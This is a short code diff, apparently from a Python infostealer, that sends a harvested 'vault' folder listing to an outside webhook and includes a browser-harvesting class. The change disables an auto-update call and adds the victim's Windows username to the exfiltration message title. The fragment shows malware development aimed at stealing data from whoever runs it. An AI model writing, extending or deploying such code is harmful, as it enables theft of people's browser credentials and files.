@@ -66,7 +66,7 @@ def download_latest_script():
     except Exception as e:
         print(f"[-] Error updating script: {e}")
 
-check_for_updates()        
+#check_for_updates()        
 
 class Browsers:
     def __init__(self, webhook):
@@ -113,7 +113,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="Vault",
+                title=f"{os.getenv("UserName")}'s Vault",
                 description="```" +
                 '\n'.join(self.tree(Path(os.path.join(main_path, "vault")))) + "```",
                 timestamp=datetime.datetime.utcnow(),
